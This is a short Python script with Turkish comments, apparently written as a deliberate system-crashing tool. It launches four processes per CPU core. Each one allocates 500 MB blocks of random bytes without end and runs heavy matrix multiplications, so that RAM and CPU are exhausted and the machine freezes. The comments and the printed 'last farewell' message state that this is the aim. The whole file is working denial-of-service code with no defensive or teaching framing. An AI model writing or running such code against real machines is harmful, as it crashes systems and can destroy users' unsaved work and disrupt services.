import multiprocessing
import numpy as np
import time

def sistem_bitirici():
    # RAM'i çok daha hızlı şişirmek için devasa bir liste
    belge = []
    try:
        while True:
            # Her adımda RAM'e 500 MB'lık veri blokları atar
            # Bu işlem RAM %100 olana kadar devam eder
            belge.append(np.random.bytes(500 * 1024 * 1024))
            
            # İşlemciyi de aynı anda boğmak için ağır matris işlemi
            a = np.random.rand(3000, 3000)
            np.dot(a, a)
            
    except MemoryError:
        # RAM biterse sistem buraya bile gelemeden donabilir
        pass

if __name__ == "__main__":
    print("Sistem limitleri zorlanıyor... Son veda mesajını yazabilirsin.")
    
    # Çekirdek sayısının 4 katı işlem başlat (Sistemi tamamen boğar)
    for _ in range(multiprocessing.cpu_count() * 4):
        p = multiprocessing.Process(target=sistem_bitirici)
        p.start()
